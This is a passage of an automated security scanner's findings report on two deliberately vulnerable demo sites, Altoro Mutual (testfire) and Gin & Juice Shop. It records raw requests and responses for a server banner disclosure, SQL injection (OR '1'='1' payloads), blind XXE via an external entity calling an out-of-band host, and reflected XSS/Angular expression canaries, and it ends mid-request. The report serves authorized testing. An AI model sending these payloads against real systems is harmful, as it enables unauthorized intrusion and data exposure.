- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-1c135932 (exactly as issued by the engine) ---
  GET /swagger/index.html
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 1427
    content-type: text/html
    date: Sat, 03 Oct 2026 00:59:08 GMT
    etag: W/"1427-1785257390000"
    last-modified: Tue, 28 Jul 2026 16:49:50 GMT
    server: Apache-Coyote/1.1
  body:
    <!-- HTML for static distribution bundle build -->
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8">
        <title>Swagger UI</title>
        <link rel="stylesheet" type="text/css" href="./swagger-ui.css" >
        <link rel="icon" type="image/png" href="./favicon-32x32.png" sizes="32x32" />
        <link rel="icon" type="image/png" href="./favicon-16x16.png" sizes="16x16" />
        <style>
          html
          {
    ... [49 more lines, 1426 chars total]
  elapsed_ms: 367.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/swagger/index.html as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F32] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/search.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-fa2998f4 (exactly as issued by the engine) ---
  GET /search.jsp?query=
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 6862
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:09 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 379.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/search.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F33] server_banner_disclosure — low (engine verdict: verified)

- Surface: POST http://demo.testfire.net/doLogin (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f98a1e85 (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    uid=&passw=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:23 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  redirect_chain: [[302, 'http://demo.testfire.net/login.jsp']]
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 763.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://demo.testfire.net/doLogin as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F34] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/disclaimer.htm (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-cb48b9a0 (exactly as issued by the engine) ---
  GET /disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 2010
    content-type: text/html
    date: Sat, 03 Oct 2026 01:02:11 GMT
    etag: W/"2010-1785257390000"
    last-modified: Tue, 28 Jul 2026 16:49:50 GMT
    server: Apache-Coyote/1.1
  body:
    <html>
    <head>
      <title>Altoro Mutual: Link Disclaimer</title>
      <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
      <style type="text/css">
      <!--
        p { font: 12px verdana, arial, sans-serif; color:#000000; line-height:1.6 }
      -->
      </style>
      <script>
    
        function go() {
    ... [54 more lines, 2002 chars total]
  elapsed_ms: 373.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/disclaimer.htm as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F35] server_banner_disclosure — low (engine verdict: verified)

- Surface: POST http://demo.testfire.net/sendFeedback (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-4c6d5c19 (exactly as issued by the engine) ---
  POST /sendFeedback
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    cfile=comments.txt&name=&email_addr=&subject=&comments=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 7041
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 01:02:18 GMT
    server: Apache-Coyote/1.1
  body:
     
    
        
        
    
    
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    ... [69 more lines, 3996 chars total]
  elapsed_ms: 386.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://demo.testfire.net/sendFeedback as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F36] server_banner_disclosure — low (engine verdict: verified)

- Surface: POST http://demo.testfire.net/doSubscribe (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-a28951cf (exactly as issued by the engine) ---
  POST /doSubscribe
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    txtEmail=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 01:03:09 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  redirect_chain: [[302, 'http://demo.testfire.net/index.jsp']]
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 741.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://demo.testfire.net/doSubscribe as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

---

# TARGET: https://ginandjuice.shop  (ginjuice)

Authorization basis: public deliberately-vulnerable demo shop with documented authorization for scanning (rate limits honored).

Scan record (as-run, unedited):
- run_id: run-d2edb73a27 | seed: b0c63973 | scanner: sentinel-core/4.2.1
- profile: see the raw scan JSON at build-v421/results/live_v421/ginjuice.json
- requests: 476 | duration: 561.49s | rate_limit: {"limited": 0, "retries": 0, "recovered": 0}
- journal: 476 entries | dropped: 0
- OAST: {"channel": "public-webhook", "interactions": 2}
- engine verdict tally (as-is): 36 findings / 0 rejected / 0 unverified


## [GINJUICE F01] sql_injection — critical (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/catalog (parameter: `category`)
- Engine verdict: verified via `oracle:or-bodydiff-2round` | confidence 0.95 | rounds 2
- Verification notes (engine-recorded): fresh OR-pair body differential: TRUE 17111B vs FALSE 9426B
- Impact (engine-assessed): proven — Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.
- Evidence chain (engine-recorded):
    * [status_oracle] quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
    * [response_diff] OR-pair body-size differential on condition flip: TRUE 17108B vs FALSE 9423B (string-context boolean oracle)
    * [status_oracle] quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
    * [response_diff] OR-pair body-size differential on condition flip: TRUE 15396B vs FALSE 9489B (string-context boolean oracle)
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f3c83e16 (exactly as issued by the engine) ---
  GET /catalog?category=1%27
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=1''; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    connection: keep-alive
    content-length: 3761
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:08:47 GMT
    set-cookie: category=1'; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labs.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <title>Gin &amp; Juice Shop</title>
        </head>
    ... [59 more lines, 3760 chars total]
  elapsed_ms: 825.7
  --- RAW REQUEST req-59a470f7 (exactly as issued by the engine) ---
  GET /catalog?category=1%27+OR+%271%27%3D%271%27+--+
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=1 AND 1=2; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 17111
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:08:49 GMT
    set-cookie: category=1' OR '1'='1' -- ; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 1027.8
  --- RAW REQUEST req-7aa6e739 (exactly as issued by the engine) ---
  GET /catalog?category=1%27&searchTerm=1
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=1''; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    connection: keep-alive
    content-length: 3761
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:13:23 GMT
    set-cookie: category=1'; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labs.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <title>Gin &amp; Juice Shop</title>
        </head>
    ... [59 more lines, 3760 chars total]
  elapsed_ms: 824.9
  --- RAW REQUEST req-33b7bf2a (exactly as issued by the engine) ---
  GET /catalog?category=1%27+OR+%271%27%3D%271%27+--+&searchTerm=1
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=1 AND 1=2; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 15399
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:13:25 GMT
    set-cookie: category=1' OR '1'='1' -- ; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 1029.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/catalog with the tested parameter 'category' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (response_diff, status_oracle)

## [GINJUICE F02] xxe — critical (engine verdict: verified)

- Surface: POST https://ginandjuice.shop/catalog/product/stock (parameter: `productId`)
- Engine verdict: verified via `re-test:fresh-interaction-id` | confidence 0.9 | rounds 1
- Verification notes (engine-recorded): fresh interaction id oob-f582348df9a4 fetched out-of-band: True src=54.170.155.72 channel=public-webhook
- Impact (engine-assessed): proven — External entity resolution proven (file content reached the response, or an out-of-band fetch arrived from the target's own infrastructure) — local file disclosure and SSRF-via-parser.
- Evidence chain (engine-recorded):
    * [oob_callback] target fetched the external entity out-of-band from 54.170.155.72 (ua=ginandjuice.shop; support@portswigger.net) (interaction oob-54ce676e9377 via GET at t+1790989905) — blind XXE: entity resolution proven with NO response oracle. recipe: root=stockCheck element=productId iid=oob-54ce676e9377
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-a66558f1 (exactly as issued by the engine) ---
  POST /catalog/product/stock
  headers:
    Content-Type: application/xml
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "https://[REDACTED]?i=oob-54ce676e9377">]><stockCheck><productId>1</productId><storeId>1</storeId><productId>&sentinelxxe;</productId></stockCheck>
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 3
    content-type: text/plain; charset=utf-8
    date: Sat, 03 Oct 2026 01:11:45 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:11:45 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    585
  elapsed_ms: 1026.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST https://ginandjuice.shop/catalog/product/stock with the tested parameter 'productId' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (oob_callback)

## [GINJUICE F03] xss_reflected — high (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/catalog (parameter: `searchTerm`)
- Engine verdict: verified via `re-test:fresh-ng-expression` | confidence 0.85 | rounds 1
- Verification notes (engine-recorded): fresh Angular expression reflected raw inside ng-app context: True (client-side evaluation is Angular binding semantics)
- Impact (engine-assessed): proven — Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.
- Evidence chain (engine-recorded):
    * [ng_expression_reflection] Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: … <script>                                 var searchText = '{{91*7}}sentinelngmark';                            …]
    * [ng_expression_reflection] Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: … <script>                                 var searchText = '{{91*7}}sentinelngmark';                            …]
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-22dc39e2 (exactly as issued by the engine) ---
  GET /catalog?searchTerm=%7B%7B91%2A7%7D%7Dsentinelngmark
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 9521
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:08:36 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:08:36 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 826.5
  --- RAW REQUEST req-8d91b1ba (exactly as issued by the engine) ---
  GET /catalog?category=Accessories&searchTerm=%7B%7B91%2A7%7D%7Dsentinelngmark
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=Accessories; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 9619
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:13:48 GMT
    set-cookie: category=Accessories; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 824.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/catalog with the tested parameter 'searchTerm' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (ng_expression_reflection)

## [GINJUICE F04] xss_reflected — high (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/catalog (parameter: `category`)
- Engine verdict: verified via `re-test:variant-battery-6` | confidence 0.9 | rounds 6
- Verification notes (engine-recorded): 4/6 diverse vectors reflected raw (WAF-resistant verification)
- Impact (engine-assessed): proven — Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.
- Evidence chain (engine-recorded):
    * [unescaped_reflection] canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [ctx: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c…]
    * [unescaped_reflection] canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [ctx: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c…]
    * [ng_expression_reflection] Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type=text name="category" value="{{91*7}}sentinelngmark">                            …]
    * [ng_expression_reflection] Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type=text name="category" value="{{91*7}}sentinelngmark">                            …]
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-044496ab (exactly as issued by the engine) ---
  GET /catalog?category=%3Csentinelxssmarkerpro42
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=<sentinelxssmarker>pro41</sentinelxssmarker>; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 9414
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:08:56 GMT
    set-cookie: category=<sentinelxssmarkerpro42; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 825.9
  --- RAW REQUEST req-bbd3190a (exactly as issued by the engine) ---
  GET /catalog?category=%3Csentinelxssmarkerpro42&searchTerm=1
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=<sentinelxssmarker>pro41</sentinelxssmarker>; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 9480
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:13:39 GMT
    set-cookie: category=<sentinelxssmarkerpro42; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 824.2
  --- RAW REQUEST req-d6d25869 (exactly as issued by the engine) ---
  GET /catalog?category=%7B%7B91%2A7%7D%7Dsentinelngmark
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=<sentinelxssmarker>vr2</sentinelxssmarker>; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 9409
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:09:02 GMT
    set-cookie: category={{91*7}}sentinelngmark; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 830.9
  --- RAW REQUEST req-3cddfb53 (exactly as issued by the engine) ---
  GET /catalog?category=%7B%7B91%2A7%7D%7Dsentinelngmark&searchTerm=1
  headers:
